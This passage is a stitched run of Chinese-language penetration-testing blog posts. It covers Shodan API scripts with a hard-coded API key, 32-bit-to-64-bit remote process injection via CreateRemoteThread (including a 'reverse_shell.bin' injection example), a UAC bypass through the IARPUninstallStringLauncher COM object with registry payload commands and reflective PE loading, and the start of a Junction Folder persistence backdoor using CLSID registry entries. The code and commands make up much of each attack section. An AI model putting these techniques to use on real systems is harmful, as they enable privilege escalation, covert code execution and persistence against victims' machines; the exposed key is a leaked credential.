    print '[!]Wrong parameter'
    sys.exit(0)
print '[*]Search string: %s' % sys.argv[1]
    
file_object = open('ip.txt', 'w')
try:
    results = api.search(sys.argv[1])
    print '[+]Results found: %s' % results['total']
    for result in results['matches']:         
#            print result['ip_str']
            file_object.writelines(result['ip_str']+'\n')
except shodan.APIError, e:
    print 'Error: %s' % e
file_object.close() 
</code></pre></div></div>

<p>命令行参数:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search.py apache
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>如果搜索多个关键词，需要用引号将搜索条件包含，例如：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search.py "apache country:US"
</code></pre></div></div>

<h3 id="4-读取文件中的ip列表反查ip信息">(4) 读取文件中的IP列表，反查IP信息</h3>

<p>python代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import shodan
import sys  
reload(sys)  
sys.setdefaultencoding('utf8')  
SHODAN_API_KEY = "SkVS0RAbiTQpzzEsahqnq2Hv6SwjUfs3"
api = shodan.Shodan(SHODAN_API_KEY)
def searchip( str ):
    try:
        host = api.host(str)
    except shodan.exception.APIError:
        print "[!]No information available"
        print "---------------------------------------------"
        return
    else:
        # Print general info
        try:
            print "IP: %s\r\nOrganization: %s\r\nOperating System: %s" % (host['ip_str'], host.get('org', 'n/a'), host.get('os', 'n/a'))
        except UnicodeEncodeError:
            print "[!]UnicodeEncode Error\r\n"     
        else:
            # Print all banners
            for item in host['data']:
                print "Port: %s\r\nBanner: %s" % (item['port'], item['data'])
        print "---------------------------------------------"   
        return
file_object = open('ip.txt', 'r')
for line in file_object:
    searchip(line)
</code></pre></div></div>

<h2 id="0x05-通过shodan官网下载搜索结果">0x05 通过Shodan官网下载搜索结果</h2>
<hr>

<p>通过Shodan官网下载数据时使用Export credits，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-26/4-1.png" alt="Alt text"></p>

<p>查询一次消耗一个export credit，无论结果有多少个，最多为10000个</p>

<p>导出格式选择为json</p>

<h3 id="1-从下载的json结果文件中提取ip">(1) 从下载的json结果文件中提取IP</h3>

<p>python代码如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import json
file_object = open("shodan_data.json", 'r')
for line in file_object:
    data = json.loads(line)
    print (data["ip_str"])  
file_object.close()
</code></pre></div></div>

<h3 id="2-从下载的json结果文件中提取指定国家的ip和端口">(2) 从下载的json结果文件中提取指定国家的IP和端口</h3>

<p>国家代号在二级元素中，对应结构：<code class="language-plaintext highlighter-rouge">data["location"]["country_code"]</code></p>

<p>python代码如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import json
import sys
import re
def search(country):
    file_object = open("shodan_data.json", 'r')
    file_object2 = open(country+".txt", 'w')
    for line in file_object:
        data = json.loads(line)  
        if re.search(data["location"]["country_code"], country, re.IGNORECASE):
            str1 = "%s:%s" % (data["ip_str"],data["port"])
            print str1
            file_object2.writelines(str1+'\n')
    file_object.close()
    file_object2.close()
if __name__ == "__main__":
    if len(sys.argv)&lt;2:
    	print ('[!]Wrong parameter')
        sys.exit(0)
    else:
        print ('[*]Search country code: %s' % sys.argv[1])
        search(sys.argv[1])
        print ("[+]Done")
</code></pre></div></div>

<p>命令行参数:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search.py US
</code></pre></div></div>

<p>生成文件US.txt，保存IP和对应的端口</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Shodan API的用法，分享使用心得和python脚本开发技巧。选择付费购买时，记得区分好三种积分(credits)</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 26, 2018
  </div>

  
</article><article class="post">
  <h1>32位程序对64位进程的远程注入实现</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>要对指定进程进行远程注入，通常使用Windows提供的API CreateRemoteThread创建一个远程线程，进而注入dll或是执行shellcode。</p>

<p>在64位系统下，该方法需要特别注意，注入的目标进程要同程序的结构保持一致，即32位程序只能对32进程作注入，64位程序只能对64位进程作注入</p>

<p><code class="language-plaintext highlighter-rouge">32位程序对64位程序进行注入时会失败(32位和64位的结构不同)</code></p>

<p>然而，在某些特殊的环境下，无法提前预知目标进程的结构，准备两个不同版本的程序又不现实</p>

<p>所以只能重新思考这个问题：</p>

<p><code class="language-plaintext highlighter-rouge">32位程序真的无法对64位程序进行远程注入吗？</code></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>我在odzhan的博客里找到了解决思路，文章地址如下：</p>

<p>https://modexp.wordpress.com/2015/11/19/dllpic-injection-on-windows-from-wow64-process/</p>

<p>本文将会介绍实现思路，参考odzhan的开源工程”pi”，编写测试代码，生成32位程序，实现对64位进程calc.exe的进程注入，验证32位程序能够对64进程作注入的结论</p>

<h2 id="0x02-实现思路">0x02 实现思路</h2>
<hr>

<h3 id="132位程序支持对64位程序的读写">1、32位程序支持对64位程序的读写</h3>

<p><strong>参考资料：</strong></p>

<p>rgb/29a：</p>

<p>http://www.vxheaven.org/lib/vrg02.html</p>

<p>ReWolf：</p>

<p>http://blog.rewolf.pl/blog/</p>

<p>https://github.com/rwfpl/rewolf-wow64ext</p>

<h3 id="2-利用createremotethread作进程注入的通用方法">2、 利用CreateRemoteThread作进程注入的通用方法</h3>

<p><strong>进程注入流程：</strong></p>

<ul>
  <li>OpenProcess</li>
  <li>VirtualAllocEx</li>
  <li>WriteProcessMemory</li>
  <li>VirtualProtectEx</li>
  <li>CreateRemoteThread</li>
  <li>WaitForSingleObject</li>
</ul>

<p>在具体的实现过程中，如果指定了进程名称，需要先将进程名称转换为进程ID，参考代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD processNameToId(LPCTSTR lpszProcessName)  
{  
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
    PROCESSENTRY32 pe;  
    pe.dwSize = sizeof(PROCESSENTRY32);  
    if (!Process32First(hSnapshot, &amp;pe)) {  
        MessageBox(NULL,"The frist entry of the process list has not been copyied to the buffer","Notice", MB_ICONINFORMATION | MB_OK);  
        return 0;  
    }  
    while (Process32Next(hSnapshot, &amp;pe)) {  
        if (!strcmp(lpszProcessName, pe.szExeFile)) {  
            return pe.th32ProcessID;  
        }  
    }    
    return 0;  
}  
</code></pre></div></div>

<p>依次实现如下操作：</p>

<ul>
  <li>根据进程ID打开进程，获得进程句柄</li>
  <li>申请内存空间</li>
  <li>写入数据</li>
  <li>将内存改为可读可执行(可选)</li>
  <li>创建线程</li>
  <li>等待线程退出(可选)</li>
</ul>

<p>代码可参考：</p>

<p>http://blog.csdn.net/g710710/article/details/7303081</p>

<p>对参考代码作细微修改，将注入进程名称指定为calc.exe，完整代码已上传github，地址如下：</p>

<p>https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThreadTest.cpp</p>

<p>程序运行后，查找进程calc.exe，接着尝试远程注入，弹出对话框，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-10/2-1.png" alt="Alt text"></p>

<p>将程序编译成x86，对32位的进程calc.exe进行注入，成功</p>

<p>将程序编译成x64，对64位的进程calc.exe进行注入，成功</p>

<p>将程序编译成x86，对64位的进程calc.exe进行注入，OpenProcess、VirtualAllocEx、WriteProcessMemory、VirtualProtectEx均正常，执行CreateRemoteThread时会报错</p>

<p><strong>解决思路：</strong></p>

<p>参考rgb/29a和ReWolf的思路，将此处的CreateRemoteThread切换为64位后再创建线程，完成后再切换回32位，即可实现32位程序对64位进程的远程注入</p>

<h3 id="3判断当前系统是32位还是64位">3、判断当前系统是32位还是64位</h3>

<p>使用API：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void WINAPI GetNativeSystemInfo(
  _Out_ LPSYSTEM_INFO lpSystemInfo
);
</code></pre></div></div>

<p>查看结构体中的wProcessorArchitecture可获得CPU架构，进而判断操作系统</p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
BOOL Is64BitOS()
{
    typedef VOID (WINAPI *LPFN_GetNativeSystemInfo)( __out LPSYSTEM_INFO lpSystemInfo );
    LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress( GetModuleHandle("kernel32"),"GetNativeSystemInfo");
    if(fnGetNativeSystemInfo)
    {
        SYSTEM_INFO stInfo = {0};
        fnGetNativeSystemInfo( &amp;stInfo);
        if( stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
            || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        {
            return TRUE;
        }
    }
    return FALSE;
}
int main()
{
    if (Is64BitOS())   
        printf("x64\n");
    else
        printf("x86\n");
    return 0;
}
</code></pre></div></div>

<h3 id="4判断注入的进程是32位还是64位">4、判断注入的进程是32位还是64位</h3>

<p>查找进程ID，打开进程，获得句柄，使用API，传入参数，进行判断</p>

<p>使用API：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL WINAPI IsWow64Process(
  __in HANDLE hProcess,
  __out PBOOL Wow64Process
);
</code></pre></div></div>

<p>返回true, 代表进程是32位，否则是64位</p>

<p>完整代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#include &lt;TlHelp32.h&gt;  

BOOL IsWow64(HANDLE hProcess)
{
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;
    
    BOOL bIsWow64 = FALSE;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
    GetModuleHandle("kernel32"),"IsWow64Process");

    if (NULL != fnIsWow64Process)
    {
        fnIsWow64Process(hProcess, &amp;bIsWow64);  
    }
    return bIsWow64;
}

DWORD processNameToId(LPCTSTR lpszProcessName)  
{  
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
    PROCESSENTRY32 pe;  
    pe.dwSize = sizeof(PROCESSENTRY32);  
    if (!Process32First(hSnapshot, &amp;pe)) {  
        MessageBox(NULL,   
            "The frist entry of the process list has not been copyied to the buffer","Notice", MB_ICONINFORMATION | MB_OK);  
        return 0;  
    }  
    while (Process32Next(hSnapshot, &amp;pe)) {  
        if (!strcmp(lpszProcessName, pe.szExeFile)) {  
            return pe.th32ProcessID;  
        }  
    }     
    return 0;  
}  

int main()
{
    BOOL           bWow64;  
    char *szExeName="calc.exe";  
    DWORD dwProcessId = processNameToId(szExeName);  
    if (dwProcessId == 0) {  
        MessageBox(NULL, "The target process have not been found !","Notice", MB_ICONINFORMATION | MB_OK);  
        return -1;  
    }  
    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);     
    if (!hTargetProcess) {  
        MessageBox(NULL, "Open target process failed !",   
            "Notice", MB_ICONINFORMATION | MB_OK);  
        return 0;  
    }  
    bWow64 = IsWow64(hTargetProcess);

    if(bWow64)
        printf("32-bit process\n");
    else
        printf("64-bit process\n");
}
</code></pre></div></div>

<h3 id="5开源工程pi">5、开源工程pi</h3>

<p><strong>下载地址：</strong></p>

<p>https://github.com/odzhan/shellcode/tree/master/win/pi</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>usage: pi [options] &lt;proc name | proc id&gt;

       -d          Wait after memory allocation before running thread
       -e &lt;cmd&gt;    Execute command in context of remote process (shows window)
       -f &lt;file&gt;   Load a PIC file into remote process
       -l &lt;dll&gt;    Load a DLL file into remote process
       -p          List available processes on system
       -x &lt;cpu&gt;    Exclude process running in cpu mode, 32 or 64
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>examples:

    pi -e "cmd /c echo this is a test &gt; test.txt &amp; notepad test.txt" -x32 iexplore.exe
    pi -l ws2_32.dll notepad.exe
    pi -f reverse_shell.bin chrome.exe
</code></pre></div></div>

<p><strong>测试系统：</strong></p>

<p>Win7x64</p>

<p><strong>cmd执行：</strong></p>

<p><code class="language-plaintext highlighter-rouge">pi32.exe -e "cmd /c start calc.exe" -x32 calc.exe</code></p>

<p>上述命令将对64位的calc.exe进行注入</p>

<p>回显如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-10/2-2.png" alt="Alt text"></p>

<p>payload没有成功执行</p>

<h2 id="0x03-最终代码">0x03 最终代码</h2>
<hr>

<p>虽然pi测试失败，但是代码值得参考，提取关键代码，开发测试程序</p>

<p>测试程序结构如下：</p>

<p>判断当前系统</p>

<ul>
  <li>
    <p>如果为32位系统， 调用系统api CreateRemoteThread，对目标进程尝试远程注入，弹出对话框</p>
  </li>
  <li>
    <p>如果为64位系统，进入下一个分支，对进程判断</p>
  </li>
</ul>

<p>判断进程calc.exe</p>

<ul>
  <li>
    <p>如果为32位，调用系统api CreateRemoteThread，对目标进程尝试远程注入，弹出对话框</p>
  </li>
  <li>
    <p>如果为64位，调用自定义api CreateRemoteThread64，对目标进程尝试远程注入，执行payload：”cmd /c start calc.exe”</p>
  </li>
</ul>

<p>完整代码已上传github，下载地址如下：</p>

<p>https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThread32to64.cpp</p>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<p><strong>测试系统：</strong></p>

<p>Win7 x64</p>

<p>1、将程序编译成32位，打开64位calc.exe</p>

<p>2、运行测试程序</p>

<p>命令行输出如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-10/2-3.png" alt="Alt text"></p>

<p>成功执行payload：”cmd /c start calc.exe”，弹出计算器</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了32位程序对64位进程远程注入的实现方法，参照以上代码可实现Windows 32位/64位系统下进程注入的通用模板。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 10, 2017
  </div>

  
</article><article class="post">
  <h1>通过COM组件IARPUninstallStringLauncher绕过UAC</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6NetFwPolicy2%E8%B6%8A%E6%9D%83%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99/">《通过COM组件NetFwPolicy2越权关闭防火墙》</a>验证结论：对于explorer.exe(或是模拟成explorer.exe)，加载高权限的COM组件不会弹出UAC的对话框。同时介绍了如何在注册表中寻找可以高权限运行的COM组件。</p>

<p>本次将要继续，介绍另一个可供使用的COM组件。</p>

<p>在我搜索到<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{FCC74B77-EC3E-4dd8-A80B-008A702075A9}</code>时，获得名称<code class="language-plaintext highlighter-rouge">ARP UninstallString Launcher</code></p>

<p>经过进一步搜索，发现ExpLife已经公开了这个COM组件的利用方法，地址如下：</p>

<p>http://www.freebuf.com/articles/system/116611.html</p>

<p>感谢ExpLife的分享，缩短了我研究的时间，所以本文将要在此基础上，侧重于分析原理和介绍更多利用方式</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>复现通过COM组件IARPUninstallStringLauncher绕过UAC的方法</li>
  <li>利用分析</li>
  <li>更多利用方式</li>
</ul>

<h2 id="0x02-复现通过com组件iarpuninstallstringlauncher绕过uac的方法">0x02 复现通过COM组件IARPUninstallStringLauncher绕过UAC的方法</h2>
<hr>

<p>ExpLife是从寻找不会弹出UAC对话框的功能入手，通过逆向找到可供利用的COM组件</p>

<p>而我的思路是先找到支持提升权限的COM组件，然后查找这个COM组件对应的功能</p>

<p>两种方法各有利弊：</p>

<ul>
  <li>ExpLife的方法需要对系统有足够了解，得找到不会弹出UAC对话框的功能</li>
  <li>我采用的方法能够找到一些不常见的COM组件，其中的功能在平时也许很难接触</li>
  <li>但使用Explife的方法，如果找到了一个功能，使用动态下断点和静态分析的方法对COM组件的逆向会很高效</li>
  <li>而我采用的方法只能通过注册表键值内容做一个大概的判断，需要进一步搜索才能定位具体的COM组件，效率不高</li>
</ul>

<p>可以将两种方法相结合，但最重要的一点，找到的COM组件不仅要能够提升权限，还要能够执行程序(或是其他有用的功能)才可以</p>

<p>下面开始介绍利用原理：</p>

<h3 id="1偷偷绕过uac">1、“偷偷”绕过UAC</h3>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%B7%B2%E5%AE%89%E8%A3%85%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%88%97%E8%A1%A8/">《渗透基础——获得当前系统已安装的程序列表》</a>曾提到过<code class="language-plaintext highlighter-rouge">控制面板</code> -&gt; <code class="language-plaintext highlighter-rouge">程序</code> -&gt; <code class="language-plaintext highlighter-rouge">程序和功能</code>中的程序列表对应以下注册表键值：</p>

<ul>
  <li>高权限程序对应注册表键值<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\</code></li>
  <li>低权限程序对应注册表键值<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\</code>(实际上为<code class="language-plaintext highlighter-rouge">HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\</code>)</li>
</ul>

<p>在卸载程序时，同时会删除程序对应的注册表键值</p>

<p>而我们在删除高权限的程序时，会删除<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\</code>下的键值，正常情况下该操作会弹出UAC对话框，但实际上并没有，这里就可以判断系统“偷偷”绕过了UAC</p>

<p>如果我们能够模拟这个功能，那么也能“偷偷”绕过UAC</p>

<h3 id="2执行程序">2、执行程序</h3>

<p>注册表项Uninstall下有一个键为”UninstallString”，内容为要执行的命令</p>

<p>如果我们替换成payload，就能实现高权限执行，即UAC绕过并执行任意程序</p>

<p>以上两点相结合，满足了通过COM组件绕过UAC的必要条件</p>

<p>所以，接下来只要能够模拟卸载程序的功能即可</p>

<p>逆向分析过程和模拟卸载的功能ExpLife在他的文章中已经写得很详细，不再赘述</p>

<p>引用文中的分析：</p>

<blockquote>
  <p>通过调用位于CARPUninstallStringLauncherCOM组件中IARPUninstallStringLauncher接口的LaunchUninstallStringAndWait方法来实现卸载程序</p>
</blockquote>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	CLSID  clsid;
	IID iid;
	LPVOID ppv = NULL;
	HRESULT hr;
	PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait pfn_LaunchUninstallStringAndWait = NULL;
	PFN_IARPUninstallStringLauncher_Release pfn_IARPUninstallStringLauncher_Release = NULL;
	if (IIDFromString(L"{FCC74B77-EC3E-4DD8-A80B-008A702075A9}", &amp;clsid) ||
		IIDFromString(L"{F885120E-3789-4FD9-865E-DC9B4A6412D2}", &amp;iid))
	return 0;
	CoInitialize(NULL);
	if (SUCCEEDED(hr))
	{
			pfn_LaunchUninstallStringAndWait  = (PFN_IARPUninstallStringLauncher_LaunchUninstallStringAndWait)(*(DWORD*)(*(DWORD*)ppv + 12));
			pfn_IARPUninstallStringLauncher_Release = (PFN_IARPUninstallStringLauncher_Release)(*(DWORD*)(*(DWORD*)ppv + 8));
			if (pfn_LaunchUninstallStringAndWait &amp;&amp; pfn_IARPUninstallStringLauncher_Release)
			{
				pfn_LaunchUninstallStringAndWait((LPVOID*)ppv, 0, L"{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}", 0, NULL);
				pfn_IARPUninstallStringLauncher_Release((LPVOID*)ppv);
			}
	}
	CoUninitialize();
	return 0;
</code></pre></div></div>

<p>其中<code class="language-plaintext highlighter-rouge">"{18E78D31-BBCC-4e6f-A21D-0A15BBC62D49}"</code>对应注册表Uninstall下的键名称</p>

<p>所以我们需要提前在注册表Uninstall下新建一个键</p>

<p>由于是绕过UAC，代表我们还没有管理员权限，因此无法操作注册表<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE</code></p>

<p>所以只能操作注册表<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER</code></p>

<p>通过cmd新建注册表项，并添加payload，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload" /v UninstallString /t REG_SZ /d "c:\windows\system32\calc.exe" /f
</code></pre></div></div>

<p>实际创建的位置为<code class="language-plaintext highlighter-rouge">HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>如果想要自己在注册表界面新建键值进行测试，创建的位置为<code class="language-plaintext highlighter-rouge">HKEY_USERS\[sid]\</code>，而不是<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER</code></p>

<p>接下来，还需要做的是修改当前进程的PEB结构，欺骗PSAPI，将当前进程模拟为explorer.exe，这样就能够“偷偷”绕过UAC，不会弹框</p>

<p>可供参考的地址：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/MasqueradePEB.cpp</p>

<p>将以上代码整合，完整的实现代码如下：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher.cpp</p>

<p><strong>补充：</strong></p>

<p>对于COM组件IARPUninstallStringLauncher，在执行”UninstallString”时，只有启动的程序结束以后当前进程才会自动退出</p>

<h2 id="0x03-更多利用方式">0x03 更多利用方式</h2>
<hr>

<p>关于更多利用方式，指的是模拟成白名单进程的方法</p>

<p>0x02的实例是修改当前进程PEB结构，将当前进程模拟为explorer.exe</p>

<p>当然也可以直接用ExpLife的两个方法：dll注入和通过rundll32加载dll</p>

<p>这里再给出一个利用方式：通过Powershell调用COM组件，默认powershell.exe是可信进程，所以也不会弹出UAC的对话框</p>

<p>这里需要使用powershell脚本Invoke-ReflectivePEInjection.ps1，下载地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</p>

<p>提供的一个功能是在powershell的内存中加载exe</p>

<p>为了使我们的程序扩展性更强，将源代码改成支持传入参数的方式，参数为要读取的注册表项，完整代码如下：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher(argv).cpp</p>

<p>接着使用Invoke-ReflectivePEInjection.ps1封装exe，并传入参数，powershell的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$PEBytes = [IO.File]::ReadAllBytes('c:\\test\\IARPUninstallStringLauncher.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "payload"
</code></pre></div></div>

<p>其中参数payload对应注册表项<code class="language-plaintext highlighter-rouge">HKEY_USERS\[sid]\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload</code>，其中的键”UninstallString”存储要执行的程序路径</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/3-1.png" alt="Alt text"></p>

<p>通过powershell执行Invoke-ReflectivePEInjection.ps1，在powershell.exe的内存中加载IARPUninstallStringLauncher.exe，以高权限调用COM组件，由于powershell.exe为可信进程，所以能够直接绕过UAC</p>

<p><strong>注：</strong></p>

<p>实际测试的一个小bug，在执行完payload后，powershell进程在退出时会弹框报错，提示内存不可读，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/3-2.png" alt="Alt text"></p>

<p>一个最简单的解决方法：</p>

<p>在脚本Main函数末尾加1</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-22/3-3.png" alt="Alt text"></p>

<p>完整利用方式：</p>

<p>1、新建注册表，并写入要执行的程序路径，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall\payload" /v UninstallString /t REG_SZ /d "c:\windows\system32\calc.exe" /f
</code></pre></div></div>

<p>2、编译IARPUninstallStringLauncher.exe</p>

<p>源码地址：</p>

<p>https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher(argv).cpp</p>

<p>3、通过powershell脚本加载exe并传入参数，powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$PEBytes = [IO.File]::ReadAllBytes('c:\\test\\IARPUninstallStringLauncher.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "payload"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>原脚本Main函数末尾记得加1，防止报错</p>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了通过COM组件IARPUninstallStringLauncher绕过UAC的方法，分享多种利用方式(修改PEB模拟成explorer.exe+以powershell.exe加载exe)，得出结论：只要以(或者模拟成)可信的进程(如explorer.exe、powershell.exe)，加载高权限的COM组件不会弹出UAC的对话框。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 22, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——Junction Folders和Library Files的后门利用</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>维基解密公布的CIA Vault 7中涉及到了Windows系统中Junction Folders和Library Files的利用</p>

<p>地址如下：</p>

<p>https://wikileaks.org/ciav7p1/cms/page_13763381.html
https://wikileaks.org/ciav7p1/cms/page_13763373.html</p>

<p>Jayden Zheng对此做了分析，分享了一个Library Files的后门利用方法，并且详细介绍了如何检测Junction Folders和Library Files的恶意利用</p>

<p>地址如下：</p>

<p>https://www.countercept.com/blog/hunting-for-junction-folder-persistence/</p>

<p>https://www.countercept.com/blog/abusing-windows-library-files-for-persistence/</p>

<p>本文将基于以上参考资料，比较Junction Folders和Library Files，对Library Files的后门利用方法做进一步利用(更加隐蔽)，开源一个POC，并且在检测上面分享自己的理解</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Junction Folders的利用方法</li>
  <li>Library Files的利用方法</li>
  <li>Library Files后门的进一步利用</li>
  <li>检测和识别</li>
</ul>

<h2 id="0x02-junction-folders的利用方法">0x02 Junction Folders的利用方法</h2>
<hr>

<p>Junction Folders可以简单理解为一个能够跳转到另一位置的文件夹</p>

<p>创建的三种常用方法：</p>

<ul>
  <li>修改注册表项</li>
  <li>修改文件夹内的desktop.ini</li>
  <li>使用特殊的文件名，例如test.{ED7BA470-8E54-465E-825C-99712043E01C}</li>
</ul>

<p>对于第三种方法，特定的CLSID对应特定的文件路径</p>

<p>如果我们通过注册表创建一个CLSID，并指定dll路径，那么在打开该文件夹时，会加载该dll</p>

<h3 id="1实际测试">1、实际测试</h3>

<p>测试dll为执行计算器，可供参考的下载地址：</p>

<p>https://github.com/3gstudent/test/raw/master/calc.dll</p>

<h4 id="1修改注册表添加注册表项">(1)修改注册表，添加注册表项</h4>

<p>bat命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "c:\test\calc.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
</code></pre></div></div>

<h4 id="2新建文件夹test11111111-1111-1111-1111-111111111111">(2)新建文件夹test.{11111111-1111-1111-1111-111111111111}</h4>

<h4 id="3选中该文件夹即可加载calcdll">(3)选中该文件夹即可加载calc.dll</h4>

<p><strong>注：</strong></p>

<p>只会加载一次，重启进程explorer.exe可以再次触发</p>

<h3 id="2系统开机自动加载的实现方法用户权限">2、系统开机自动加载的实现方法(用户权限)</h3>

<h4 id="1重命名系统文件夹">(1)重命名系统文件夹</h4>

<p>将<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Windows\Start Menu\Programs\Accessories</code>重命名为<code class="language-plaintext highlighter-rouge">Accessories.{11111111-1111-1111-1111-111111111111}</code></p>

<h4 id="2新建文件夹">(2)新建文件夹</h4>

<p>将文件夹test.{11111111-1111-1111-1111-111111111111}保存在以下任一位置：</p>

<ul>
  <li>%appdata%\Microsoft\Windows\Start Menu\Programs\</li>
  <li>%appdata%\Microsoft\Windows\Start Menu\Programs\的子目录</li>
</ul>

<h2 id="0x03-library-files的利用方法">0x03 Library Files的利用方法</h2>
<hr>

<p>文件后缀名为library-ms，位于<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Windows\Libraries</code></p>
